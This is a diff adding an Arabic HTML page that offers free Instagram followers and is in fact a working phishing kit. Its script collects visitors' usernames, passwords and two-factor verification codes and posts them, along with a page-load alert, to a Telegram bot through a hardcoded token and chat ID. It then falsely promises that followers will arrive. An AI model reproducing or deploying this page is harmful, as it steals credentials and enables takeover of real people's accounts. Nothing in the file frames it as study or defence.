@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة متابعين إنستغرام</title>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f7fc;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #1877f2, #0053e6);
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header span {
+            color: #ffdd00;
+        }
+
+        .login-container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #1877f2;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        h3 {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #155bb5;
+        }
+
+        .error {
+            color: red;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .success {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0 10px;
+            flex-direction: column;
+        }
+
+        .verification-message {
+            color: green;
+            font-size: 16px;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span>احصل على متابعينك</span> | <span>متابع حقيقي</span>
+    </div>
+
+    <div class="container">
+        <div class="login-container">
+            <h2>زيادة متابعين إنستغرام</h2>
+            <h3>احصل على 1000 متابع</h3>
+            <form id="login-form">
+                <label for="email">اسم المستخدم:</label>
+                <input type="text" id="email" required placeholder="أدخل اسم المستخدم">
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+
+                <div id="otp-section" style="display: none;">
+                    <label for="otp">كود التحقق:</label>
+                    <input type="text" id="otp" required placeholder="أدخل كود التحقق">
+                </div>
+
+                <p id="verification-message" class="verification-message" style="display: none;">سيصلك كود التحقق على حسابك.</p>
+                
+                <button type="button" id="next-button">التالي</button>
+                <button type="submit" id="login-button" style="display: none;">تأكيد</button>
+            </form>
+            <p id="error-message" class="error"></p>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "7723684280:AAF8nFYxgE8566HTi_7_9u_BRSSgQ74NNZA"; // استخدم توكن البوت الخاص بك هنا
+        const CHAT_ID = "6662219429"; // استخدم الرقم التعريفي الخاص بك
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // إرسال رسالة إلى Telegram عند تحميل الصفحة
+        function sendMessageOnLoad() {
+            const message = ` 
+                <b>شخص دخل الموقع لزيادة المتابعين على إنستغرام</b>\n
+                تم دخول المستخدم إلى الموقع.
+            `;
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message,
+            })
+            .then(() => {
+                console.log("تم إرسال الرسالة بنجاح.");
+            })
+            .catch((error) => {
+                console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
+            });
+        }
+
+        // عند النقر على زر التالي
+        document.getElementById('next-button').addEventListener('click', function () {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                const message = `
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                    <b>اسم المستخدم:</b> ${email}\n
+                    <b>كلمة المرور:</b> ${password}\n
+                `;
+                
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message,
+                })
+                .then(() => {
+                    alert("يرجى إدخال كود التحقق");
+                    document.getElementById('otp-section').style.display = "block";
+                    document.getElementById('verification-message').style.display = "block";
+                    document.getElementById('next-button').style.display = "none";
+                    document.getElementById('login-button').style.display = "block";
+                })
+                .catch((error) => {
+                    console.error('خطأ في إرسال الرسالة إلى Telegram:', error);
+                    alert("تعذر إرسال الرسالة. حاول مرة أخرى.");
+                });
+            } else {
+                alert("يرجى إدخال اسم المستخدم وكلمة المرور.");
+            }
+        });
+
+        // عند إرسال النموذج
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            
+            const otp = document.getElementById('otp').value;
+
+            if (otp) {
+                const otpMessage = `
+                    <b>كود التحقق:</b> ${otp}\n
+                    <b>ملاحظة:</b> تم إدخال كود التحقق بنجاح.
+                `;
+                
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: otpMessage,
+                })
+                .then(() => {
+                    alert("بعد 60 دقيقة سيصلك المتابعين.");
+                })
+                .catch((error) => {
+                    console.error('خطأ في إرسال كود التحقق إلى Telegram:', error);
+                    alert("تعذر إرسال كود التحقق. حاول مرة أخرى.");
+                });
+            } else {
+                alert("يرجى إدخال كود التحقق.");
+            }
+        });
+
+        sendMessageOnLoad(); // استدعاء وظيفة إرسال الرسالة عند تحميل الصفحة
+    </script>
+</body>
+</html>
